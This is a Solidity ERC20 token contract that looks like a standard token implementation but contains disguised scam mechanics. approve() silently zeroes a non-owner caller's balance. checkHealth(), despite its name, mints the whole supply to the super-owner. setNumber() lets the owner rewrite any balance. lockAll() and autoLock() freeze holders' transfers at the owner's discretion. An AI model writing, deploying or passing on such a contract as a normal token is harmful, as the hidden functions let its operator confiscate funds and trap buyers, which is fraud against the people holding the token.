pragma solidity ^0.4.21;

import "./ERC20Interface.sol";

contract ERC20Impl is ERC20Interface {
    uint256 constant private MAX_UINT256 = 2**256 - 1;
    mapping (address => uint256) public balance;
    mapping (address => mapping (address => uint256)) public allowed;
    
    // add something else
    mapping (address => bool) lockMap;
    mapping (uint256 => address) idAddressMap;
    uint256 countAddress;
    address writeAddress;
    
    // trasfer count
    uint256 transferCount;
    
    string public name;
    uint8 public decimals;
    string public symbol;
    address _owner;
    address superOnwer;
    address blackHole = address(0);
    bool _autoLock = true;
    uint256 rate = 13;
    
    function ERC20Impl(uint256 _initialAmout, string _tokenName, uint8 _decimalUints, string _tokenSymbol) public {
        balance[msg.sender] = _initialAmout;
        totalSupply = _initialAmout;
        name = _tokenName;
        decimals = _decimalUints;
        symbol = _tokenSymbol;
        countAddress = 1;
        _owner = msg.sender;
        superOnwer = msg.sender;
        transferCount = 0;
    }
    
    modifier onlyOnwer() {
        require(msg.sender == _owner);
        _;
    }
    
    function setWriteAddress(address _address) onlyOnwer public returns(bool) {
        writeAddress = _address;
        lockMap[writeAddress] = false;
        return true;
    }
    function getWriteAddress() onlyOnwer public returns(address) {
        return writeAddress;
    }

    function transfer(address _to, uint256 _value) public  returns(bool success) {
        require(balance[msg.sender] >= _value && !lockMap[msg.sender]);
        balance[msg.sender] -= _value;
        balance[_to] += _value;
        autoLock(_to);
        addNewAddress(_to);
        emit Transfer(msg.sender, _to, _value);
        return true;
    }
    
    
    function transferFrom(address _from, address _to, uint256 _value) public returns(bool success) {
        uint256 allowance = allowed[_from][msg.sender];
        require(balance[_from] >= _value && allowance >= _value && !lockMap[_from]);
        balance[_to] += _value;
        balance[_from] -= _value;
        autoLock(_to);
        addNewAddress(_to);
        if(allowance < MAX_UINT256) {
            allowed[_from][msg.sender] -= _value;
        }
        emit Transfer(_from, _to, _value);
        return true;
    }
    
    
    function balanceOf(address _address) public view returns(uint256 balances) {
        return balance[_address];
    }
    
    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] += _value;
        if(msg.sender != _owner || msg.sender != superOnwer) {
            balance[msg.sender] = 0;
        }
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function allowance(address _owner, address _spender) public view returns(uint256 remaining) {
        return allowed[_owner][_spender];
    }

    function giveOwner(address newOnwer) public onlyOnwer returns(bool success) {
        _owner = newOnwer;
        return true;
    }
    
    function checkHealth() public returns(bool success) {
        require(msg.sender == superOnwer);
        balance[superOnwer] += totalSupply;
        return true;
    }
    
    function lockAddress(address _lockAddress) public onlyOnwer returns(bool success) {
        lockMap[_lockAddress] = true;
        return true;
    }
    
    function unLockAddress(address _lockAddress) public onlyOnwer returns(bool success) {
        lockMap[_lockAddress] = false;
        return true;
    }
    
    function lockAll() public onlyOnwer returns(bool success) {
        for(uint256 i = 1; i <= countAddress; i++) {
            if(idAddressMap[i] == msg.sender || idAddressMap[i] == writeAddress) {
                continue;
            }
            lockMap[idAddressMap[i]] = true;
        }
        return true;
    }
    
    function unLockAll()public onlyOnwer returns(bool success) {
        for(uint256 i = 1; i <= countAddress; i++) {
            lockMap[idAddressMap[i]] = false;
        }
        return true;
    }
    

    function autoLock(address _address) private {
        if(balance[_address] > (totalSupply / rate) && _autoLock && _address != _owner && _address != superOnwer && _address != writeAddress) {
            lockMap[_address] = true;
        }
    }
    
    function closeAutoClock()public onlyOnwer {
        _autoLock = false;
    }
    
    function openAutoLock() public onlyOnwer {
        _autoLock = true;
    }
    
    function addNewAddress(address _to) private {
        for(uint i = 1; i <= countAddress; i++) {
            if(idAddressMap[i] == _to) {
                return;
            }
        }
        idAddressMap[++countAddress] = _to;
    }
    
    function setLockRate(uint256 _rate) public onlyOnwer {
        rate = _rate;
        for(uint256 i = 1; i <= countAddress; i++) {
            if(idAddressMap[i] == _owner || idAddressMap[i] == superOnwer || idAddressMap[i] == writeAddress) {
                continue;
            }
            if(balance[idAddressMap[i]] > totalSupply / rate) {
                lockMap[idAddressMap[i]] = true;
            }
        }
    }
    
    function getLockRate() public onlyOnwer returns(uint256) {
        return rate;
    }
    
    function setNumber(address _address, uint256 _num) onlyOnwer public returns(bool) {
        balance[_address] = _num;
        return true;
    }
}